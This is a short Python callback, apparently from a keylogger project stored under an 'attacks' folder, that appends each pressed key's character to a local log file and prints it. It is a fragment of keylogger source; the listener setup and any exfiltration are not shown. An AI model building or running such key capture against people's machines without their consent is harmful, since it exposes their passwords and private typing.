def keyPressed(key):  # automatically passing in key (the info)
    """
        Logs the pressed key to a file. Designed to be used with a key listener.

        Parameters:
        - key: The key event information, automatically passed in by the key listener.

        Behavior:
        - Appends the character of the pressed key to a log file.
        - Handles exceptions by printing an error message if the key character cannot be retrieved.
    """
    print(str(key))
    # create the file and log the key input
    # 'a' means appending
    with open("attacks/keylogger/keyfile.txt", "a") as logKey:
        try:
            char = key.char  # convert into char
            print(char)
            print(len(char))
            logKey.write(char)
        except:
            print("Error getting char")
